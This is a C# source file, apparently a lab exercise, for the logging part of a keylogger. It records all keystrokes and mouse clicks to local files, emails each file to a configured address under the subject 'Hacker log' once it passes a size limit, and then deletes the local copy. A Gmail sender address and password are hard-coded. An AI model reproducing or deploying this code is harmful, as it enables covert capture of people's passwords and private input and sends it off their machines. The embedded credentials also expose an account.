using System;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Text.RegularExpressions;
using System.Threading;

namespace Lan8._1_GlobalHooks
{
    internal class Logger
    {
        private readonly ConfigFile _configuration;
        private const string KeyboardLogFilePath = @"keyboard.log";
        private const string MouseLogFilePath = @"mouse.log";

        private const string From = "tuthajam@gmail.com";
        private const string Password = "123454321L";

        public Logger(ConfigFile configuration)
        {
            _configuration = configuration;
        }

        public void LogMouse(string keyName, string position)
        {
            using (var streamWriter = new StreamWriter(MouseLogFilePath, true))
            {
                streamWriter.WriteLine($"[{DateTime.Now}]: Key[{keyName}] Position[{position}]");
            }
            CheckLogFileSize(MouseLogFilePath);
        }

        public void LogKeyboard(string keyName)
        {
            using (var streamWriter = new StreamWriter(KeyboardLogFilePath, true))
            {
                streamWriter.WriteLine($"[{DateTime.Now}]: Key[{keyName}]");
            }
            CheckLogFileSize(KeyboardLogFilePath);
        }

        private void CheckLogFileSize(string filePath)
        {
            if (new FileInfo(filePath).Length <= _configuration.FileSize) return;
            if (string.IsNullOrEmpty(_configuration.Email)) return;
            SendEmail(_configuration.Email, @"Log files", filePath);
            new FileInfo(filePath).Delete();
        }

        public void SendEmail(string to, string subject, string filePath)
        {
            var from = new MailAddress(From);
            var newTo = new MailAddress(to);
            var mail = new MailMessage(from, newTo)
            {
                Body = String.Empty,
                Subject = "Hacker log"
            };

            var smtpClient = new SmtpClient
            {
                Credentials = new System.Net.NetworkCredential(from.Address, Password),
                EnableSsl = true
            };

            using (var attachment = new Attachment(filePath))
            {
                mail.Attachments.Add(attachment);
                smtpClient.Send(mail);
            }
        }
    }
}
